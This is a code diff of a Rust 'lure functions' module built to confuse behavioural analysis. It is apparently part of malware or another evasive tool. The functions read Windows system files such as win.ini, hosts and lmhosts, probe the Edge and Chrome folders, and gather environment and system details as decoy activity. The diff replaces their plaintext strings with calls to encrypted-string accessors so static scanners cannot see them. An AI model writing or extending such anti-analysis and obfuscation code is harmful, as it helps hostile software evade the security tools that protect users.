@@ -1,14 +1,15 @@
-//! Module de fonctions leurres pour tromper l'analyse comportementale.
+//! Lure functions to confuse behavioural analysis.
 
 use std::fs;
 use std::time::{SystemTime, UNIX_EPOCH};
 use base64::Engine;
+use crate::encrypted::*;
 
 pub fn calculate_fibonacci(n: u32) -> u64 {
-    let mut a = 0;
-    let mut b = 1;
+    let mut a = 0u64;
+    let mut b = 1u64;
     for _ in 0..n {
-        let c = a + b;
+        let c = a.wrapping_add(b);
         a = b;
         b = c;
     }
@@ -23,7 +24,7 @@ pub fn encrypt_dummy(data: &[u8]) -> Vec<u8> {
 #[allow(dead_code)]
 pub fn enumerate_env_vars() {
     for (key, value) in std::env::vars() {
-        if key.starts_with("USER") {
+        if key.starts_with(&s_decoy_env_user()) {
             let _ = format!("{}={}", key, value);
         }
     }
@@ -64,22 +65,22 @@ pub fn base64_encode_dummy(data: &[u8]) -> String {
 }
 
 pub fn json_parse_dummy() -> bool {
-    let json_str = r#"{"name":"test","value":123}"#;
-    let _: serde_json::Value = serde_json::from_str(json_str).unwrap_or_default();
+    let json_str = s_decoy_json_dummy();
+    let _: serde_json::Value = serde_json::from_str(&json_str).unwrap_or_default();
     true
 }
 
 pub fn read_system_files() {
-    let _ = fs::read_to_string("C:\\Windows\\win.ini");
-    let _ = fs::read_to_string("C:\\Windows\\System32\\drivers\\etc\\hosts");
+    let _ = fs::read_to_string(s_decoy_win_ini());
+    let _ = fs::read_to_string(s_decoy_hosts());
 }
 
 #[allow(dead_code)]
 pub fn enumerate_programs() {
-    let pf = std::env::var("ProgramFiles").unwrap_or_default();
-    let local = std::env::var("LOCALAPPDATA").unwrap_or_default();
-    let _ = std::fs::read_dir(format!("{}\\Microsoft\\Edge\\Application", pf));
-    let _ = std::fs::read_dir(format!("{}\\Google\\Chrome\\Application", local));
+    let pf = std::env::var(s_decoy_pf_env()).unwrap_or_default();
+    let local = std::env::var(s_decoy_local_env()).unwrap_or_default();
+    let _ = std::fs::read_dir(format!("{}\\{}", pf, s_decoy_edge_path()));
+    let _ = std::fs::read_dir(format!("{}\\{}", local, s_decoy_chrome_path()));
 }
 
 #[allow(dead_code)]
@@ -92,13 +93,13 @@ pub fn check_network() {
 
 #[allow(dead_code)]
 pub fn read_config_files() {
-    let _ = fs::read_to_string("C:\\Windows\\System32\\drivers\\etc\\lmhosts.sam");
-    let _ = fs::read_to_string("C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache\\ie\\counter.dat");
+    let _ = fs::read_to_string(s_decoy_lmhosts());
+    let _ = fs::read_to_string(s_decoy_iecount());
 }
 
 pub fn system_info_gathering() {
-    let _ = std::env::var("OS");
-    let _ = std::env::var("PROCESSOR_ARCHITECTURE");
-    let _ = std::env::var("NUMBER_OF_PROCESSORS");
-    let _ = std::env::var("SystemRoot");
+    let _ = std::env::var(s_decoy_env_os());
+    let _ = std::env::var(s_decoy_env_proc_arch());
+    let _ = std::env::var(s_decoy_env_num_procs());
+    let _ = std::env::var(s_decoy_env_sysroot());
 }
